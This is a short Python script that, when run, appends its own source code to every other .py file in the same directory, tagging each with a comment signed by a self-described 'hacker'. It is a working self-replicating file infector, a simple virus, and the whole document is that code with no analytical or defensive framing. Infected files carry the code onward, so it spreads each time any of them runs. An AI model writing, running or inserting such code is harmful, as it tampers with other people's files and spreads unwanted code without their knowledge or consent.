import os

def copy_to_other_files():
    # Get the absolute path of the current script
    current_file = os.path.abspath(__file__)

    # Loop through files in the same directory as the current script
    for filename in os.listdir(os.path.dirname(current_file)):
        # Check if the file has a ".py" extension and is not the current script
        if filename.endswith(".py") and filename != os.path.basename(current_file):
            # Create the path for the target file
            target_file = os.path.join(os.path.dirname(current_file), filename)
            
            # Read the source code from the current file
            with open(current_file, "r") as source, open(target_file, "r") as target:
                source_code = source.read()
                target_code = target.read()
                
                # Check if the function is not already present in the target file
                if "copy_to_other_files" not in target_code:
                    # Append a comment and the source code to the target file
                    with open(target_file, "a") as target:
                        target.write("\n\n# Hello, I'm Mostafa, the hacker xD :*\n" + source_code)

if __name__ == "__main__":
    # Call the function when the script is executed
    copy_to_other_files()
